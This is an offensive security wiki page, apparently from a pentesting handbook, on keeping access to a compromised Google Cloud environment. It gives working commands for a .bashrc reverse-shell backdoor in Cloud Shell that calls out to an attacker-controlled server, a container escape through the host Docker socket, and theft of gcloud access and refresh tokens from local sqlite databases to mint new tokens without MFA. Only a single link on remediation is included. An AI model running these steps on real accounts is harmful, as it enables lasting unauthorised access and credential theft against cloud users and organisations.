# GCP - Persistance

These are useful techniques once, somehow, you have compromised some GCP credentials or machine running in a GCP environment.

## Google’s Cloud Shell <a href="#e5eb" id="e5eb"></a>

### Persistent Backdoor

[**Google Cloud Shell**](https://cloud.google.com/shell/) **** provides you with command-line access to your cloud resources directly from your browser without any associated cost.

You can access Google's Cloud Shell from the **web console** or running **`gcloud cloud-shell ssh`**.&#x20;

This console has some interesting capabilities for attackers:

1. **Any Google user with access to Google Cloud** has access to a fully authenticated Cloud Shell instance.
2. Said instance will **maintain its home directory for at least 120 days** if no activity happens.
3. There is **no capabilities for an organisation to monitor** the activity of that instance.

This basically means that an attacker may put a backdoor in the home directory of the user and as long as the user connects to the GC Shell every 120days at least, the backdoor will survive and the attacker will get a shell everytime it's run just by doing:

```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```

### Container Escape

Note that the Google Cloud Shell runs inside a container, you can **easily escape to the host** by doing:

```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```

This is not considered a vulnerability by google, but it gives you a wider vision of what is happening in that env.

Moreover, notice that from the host you can find a service account token:

```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```

With the following scopes:

```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```

## Token Hijacking

### Authenticated User

If you manage to access the home folder of an **authenticated user in GCP**, by **default**, you will be able to **get tokens for that user as long as you want** without needing to authenticated and independently on the machine you use his tokens from and even if the user has MFA configured.

This is because by default you **will be able to use the refresh token as long** as you want to generate new tokens.

To get the current token of a user you can run:

```bash
sqlite3 ./.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```

To get the details to generate a new access token run:

```bash
sqlite3 ./.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```

To get a new refreshed access token with the refresh token, client ID, and client secret run:

```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```

### Service Accounts

Just like with authenticated users, if you manage to **compromise the private key file** of a service account you will be able to **access it usually as long as you want**.\
However, if you steal the **OAuth token** of a service account this can be even more interesting, because, even if by default these tokens are useful just for an hour, if the **victim deletes the private api key, the OAuh token will still be valid until it expires**.

### Metadata

Obviously, as long as you are inside a machine running in the GCP environment you will be able to **access the service account attached to that machine contacting the metadata endpoint** (note that the Oauth tokens you can access in this endpoint are usually restricted by scopes).

### Remediations

Some remediations for these techniques are explained in [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

## References

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
